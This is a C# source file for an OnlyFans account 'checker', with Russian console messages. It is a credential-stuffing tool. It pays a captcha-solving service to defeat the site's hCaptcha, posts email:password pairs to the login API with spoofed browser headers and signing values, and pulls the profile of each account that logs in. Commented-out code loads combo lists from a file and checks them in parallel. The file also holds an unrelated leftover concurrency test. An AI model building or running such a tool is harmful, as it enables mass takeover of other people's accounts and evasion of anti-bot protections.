using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using RestSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TwoCaptcha.Captcha;
using RuCaptcha = TwoCaptcha.TwoCaptcha;



enum CheckResult
{
    Valid,
    Invalid,
    InvalidEmail,
    WrongCaptcha,
    NeedRefreshPage,
    Error,
    InknowError
}

namespace CheckerOnlyFans
{
    class Checker
    {
        private readonly string apiKey;
        private readonly RuCaptcha solver;
        public Checker(string apiKey)
        {
            this.apiKey = apiKey;
            solver = new RuCaptcha(apiKey);
        }
        private static string base64Encode(string text)
        {
            var textBytes = Encoding.UTF8.GetBytes(text);
            return Convert.ToBase64String(textBytes);
        }
        private static long getTime()
        {
            return DateTimeOffset.Now.ToUnixTimeSeconds() * 1000 - 10000;
        }

        public async Task<string> GetInvisibleCaptcha()
        {

            HCaptcha captcha = new HCaptcha();
            captcha.SetSiteKey("314ec50a-c08a-4c0a-a5c4-4ed4c7ed5aff");
            captcha.SetUrl("https://onlyfans.com");

            try
            {
                await solver.Solve(captcha);
                return captcha.Code;
            }
            catch (Exception e)
            {
                Console.WriteLine("Error occurred: " + e.Message);
                return null;
            }
        }

        public async Task<string> GetCaptcha()
        {
            HCaptcha captcha = new HCaptcha();
            captcha.SetSiteKey("7c8456cf-fb4e-48fc-a054-d97bc7765634");
            captcha.SetUrl("https://onlyfans.com");

            try
            {
                await solver.Solve(captcha);
                return captcha.Code;
            }
            catch (Exception e)
            {
                Console.WriteLine("Error occurred: " + e.Message);
                return null;
            }
        }

        public async Task<string> Check(string email, string password)
        {
            if (string.IsNullOrEmpty(email) || string.IsNullOrEmpty(password))
            {
                throw new ArgumentException("Email или пароль пуст");
            }
            Console.WriteLine($"Запущен чек аккаунта {email}:{password}");
            string hCaptchaPassiveResponse = await GetInvisibleCaptcha();
            string hCaptchaResponse = await GetCaptcha();
            //string hCaptchaPassiveResponse = "qwe";
            //string hCaptchaResponse = "asd";

            if (hCaptchaPassiveResponse == null || hCaptchaResponse == null)
            {
                throw new Exception("Не удалось решить капчу");
            }
            string encodedPassoword = base64Encode(password);

            var client = new RestClient();
            var request = new RestRequest("https://onlyfans.com/api2/v2/users/login", Method.Post);
            request.AddHeader("authority", "onlyfans.com");
            request.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"");
            request.AddHeader("time", "1648337832999");
            request.AddHeader("sec-ch-ua-mobile", "?0");
            request.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36");
            request.AddHeader("app-token", "33d57ade8c02dbc5a333db99ff9ae26a");
            request.AddHeader("content-type", "application/json");
            request.AddHeader("accept", "application/json, text/plain, */*");
            request.AddHeader("x-bc", "8cbc13a64c96aa10eeb870b75a4deb1b17feb8ea");
            request.AddHeader("sign", "2893:e4dd23bd3dd12432d362bfc236bcfcffda6b824b:ef6:623dee62");
            request.AddHeader("sec-ch-ua-platform", "\"Windows\"");
            request.AddHeader("origin", "https://onlyfans.com");
            request.AddHeader("sec-fetch-site", "same-origin");
            request.AddHeader("sec-fetch-mode", "cors");
            request.AddHeader("sec-fetch-dest", "empty");
            request.AddHeader("referer", "https://onlyfans.com/");
            request.AddHeader("accept-language", "ru-RU,ru;q=0.9");
            //request.AddHeader("cookie", "sess=n9ltl1qu1gsnfsn9oqk8d4htvi; csrf=02x2EfwJb8b5e6c211eaef609cae0749d3f64b8d; ref_src=; fp=cd96e74d6c65fd02936a07eaf5268f23; sess=n9ltl1qu1gsnfsn9oqk8d4htvi");
            //var body = @"{""email"":"""",""password"":""qweqwe"",""h-captcha-passive-response"":"""",""h-captcha-response"":"""",""encodedPassword"":""""}";

            string body = "{\"email\":\"" + email + "\",\"password\":\"" + password + "\",\"h-captcha-passive-response\":\"" + hCaptchaPassiveResponse + "\",\"h-captcha-response\":\"" + hCaptchaResponse + "\",\"encodedPassword\":\"" + encodedPassoword + "\"}";
            //request.AddParameter("application/json", body, ParameterType.RequestBody);
            request.AddBody(body, "application/json");
            var response = await client.ExecuteAsync(request);
            string jsonText = response.Content;
            JObject json = JObject.Parse(jsonText);
            if (json.TryGetValue("error", out JToken error))
            {
                if (JObject.Parse(error.ToString()).TryGetValue("message", out JToken message))
                {
                    string messageText = message.ToString();
                    switch (messageText)
                    {
                        case "Wrong email or password":
                            return "Неправильный email или пароль";
                        case "Please refresh the page":
                            return "Обновите страницу";
                        case "Email is not valid":
                            return "Невалидный email";
                        default:
                            return messageText;
                    }
                    //if ((errorToken as JObject).TryGetValue("message", out JToken messageToken))
                    //{
                    //    string message = messageToken.ToString();
                    //    switch (message)
                    //    {
                    //        case "Captcha wrong":
                    //            return "Неверная капча";
                    //        default:
                    //            return message;
                    //    }
                    //}
                    //else
                    //{
                    //    return jsonText;
                    //}
                }
                else
                {
                    return jsonText;
                }
            }
            else if (json.TryGetValue("userId", out JToken userId))
            {
                response = await GetMe(client);
                return userId.ToString();
            }
            else
            {
                return jsonText;
            }
        }

        private async Task<RestResponse> GetMe(RestClient client)
        {
            var request = new RestRequest("https://onlyfans.com/api2/v2/users/me", Method.Get);
            request.AddHeader("authority", "onlyfans.com");
            request.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"");
            request.AddHeader("time", "1648302473696");
            request.AddHeader("sec-ch-ua-mobile", "?0");
            request.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36");
            request.AddHeader("app-token", "33d57ade8c02dbc5a333db99ff9ae26a");
            request.AddHeader("accept", "application/json, text/plain, */*");
            request.AddHeader("x-bc", "2aa2e70406358311b7caff03779ca3c0bd1741d4");
            request.AddHeader("sign", "2893:26dbd6b72e995d61af77e8558191ce03f968130b:cf8:623dee62");
            request.AddHeader("sec-ch-ua-platform", "\"Windows\"");
            request.AddHeader("sec-fetch-site", "same-origin");
            request.AddHeader("sec-fetch-mode", "cors");
            request.AddHeader("sec-fetch-dest", "empty");
            request.AddHeader("referer", "https://onlyfans.com/");
            request.AddHeader("accept-language", "ru-RU,ru;q=0.9");
            string cookies = "";
            foreach (var item in client.CookieContainer.GetCookies(new Uri("https://onlyfans.com/")))
            {
                cookies += $"{item}; ";
            }
            cookies.TrimEnd(' ');
            cookies.TrimEnd(';');
            request.AddHeader("cookie", cookies);

            var response = await client.ExecuteAsync(request);
            Console.WriteLine(response.Content);
            return response;
        }


        class Config
        {
            string configName;

            public string ApiKey { get;}

            public static string ReadApiToken()
            {
                string apiToken = null;
                do
                {
                    Console.WriteLine("API ключ rucaptcha:");
                    apiToken = Console.ReadLine();
                    Console.Clear();

                } while (apiToken.Length != 32 || string.IsNullOrEmpty(apiToken));
                return apiToken;
            }
            public Config(string configPath)
            {
                configName = configPath;
                ApiKey = LoadApiKey();
            }
            public Config():this("config.json") { }

            private string LoadApiKey()
            {

                string apiKey;
                if (File.Exists(configName))
                {
                    var json = JObject.Parse(File.ReadAllText(configName));
                    if (json.TryGetValue("rucaptchaApiKey", out var apiKeyToken))
                    {
                        if (apiKeyToken.ToString().Length == 32)
                        {
                            apiKey = apiKeyToken.ToString();
                        }
                        else
                        {
                            Console.WriteLine("Длина токена должна быть 32 символа");
                            apiKey = ReadApiToken();
                        }
                    }
                    else
                    {
                        Console.WriteLine("Не удалось получить API ключ из конфига");
                        File.Delete(configName);
                        apiKey = apiKey = ReadApiToken();
                        File.WriteAllText(configName, JsonConvert.SerializeObject(new { rucaptchaApiKey = apiKey }));
                    }

                }
                else
                {
                    apiKey = apiKey = ReadApiToken();
                    File.WriteAllText(configName, JsonConvert.SerializeObject(new { rucaptchaApiKey = apiKey }));
                    //string apiKey = JObject.Parse(File.ReadAllText("qwe.txt"))["rucaptchaApiKey"].ToString();
                }
                return apiKey;
            }
        }


        internal class Program
        {
            static void Main(string[] args)
            {

                Config config = new Config();
                Console.WriteLine(config.ApiKey);
                //Checker checker = new Checker();
                //List<(string,string)> data = new List<(string,string)> ();

                //if (File.Exists("unchecked.txt"))
                //{
                //    foreach (var line in File.ReadAllLines("unchecked.txt"))
                //    {
                //        if (line.Contains(':'))
                //        {
                //            var acc = line.Split(':');
                //            data.Add((acc.FirstOrDefault(), acc.LastOrDefault()));
                //        }
                //    }
                //    Console.WriteLine($"Загружено валидных строк: {data.Count}");
                //}
                //else
                //{
                //    Console.WriteLine("Файл unchecked.txt не найден.");
                //}

                //List<Task<string>> tasks = new List<Task<string>>();

                //foreach (var item in data)
                //{
                //    Console.WriteLine($"В очередь добален: {item.Item1}:{item.Item2}");
                //    Task<string> temp = Task.Run(async () => {

                //        sem.WaitOne();
                //        var result = await checker.Check(item.Item1, item.Item2);
                //        sem.Release();
                //        return result; 

                //    });
                //    tasks.Add(temp);
                //}


                //Task.WaitAll(tasks.ToArray());

                //File.WriteAllText("qwe.txt", JsonConvert.SerializeObject(new { rucaptchaApiKey = "qwe" }));
                
            }

            static Semaphore sem = new Semaphore(3, 3);

            public static async Task Run()
            {
                TaskFactory taskFactory = new TaskFactory();
                Task task1 = SomeFunc("task1");
                Task task2 = SomeFunc("task2");
                Task task3 = SomeFunc("task3");
                Task task4 = SomeFunc("task4");
                Task task5 = SomeFunc("task5");
                Task task6 = SomeFunc("task6");
                Task task7 = SomeFunc("task7");

                //List<Task> tasks = new List<Task>() { task1, task2, task3, task4, task5, task6, task7 };
                List<Task> tasks = new List<Task>();
                for (int i = 0; i < 10000; i++)
                {
                    tasks.Add(SomeFunc($"test{i}"));
                }
                TaskFactory taskFactory1 = new TaskFactory();
                await taskFactory1.StartNew(() => Console.WriteLine("qwe"));
                Console.WriteLine(taskFactory1.Scheduler.MaximumConcurrencyLevel);
                
            }
            public static Random random = new Random();
            public static async Task<string> SomeFunc(string name)
            {
                await Task.Run(() =>
                {
                    int count = random.Next(1, 100000);
                    for (int i = 0; i < count; i++)
                    {
                        var foo = Math.Sqrt(Math.Pow(i, 0.2));
                        foo = Math.Sqrt(Math.Pow(i, 0.2));
                        foo = Math.Sqrt(Math.Pow(i, 0.2));
                        foo = Math.Sqrt(Math.Pow(i, 0.2));
                        foo = Math.Sqrt(Math.Pow(i, 0.2));
                        foo = Math.Sqrt(Math.Pow(i, 0.2));
                        foo = Math.Sqrt(Math.Pow(i, 0.2));
                        //Console.WriteLine($"{name} [{i}|{count}]");
                    }
                });
                //Console.WriteLine(name);
                return name;
            }


        }
    }
}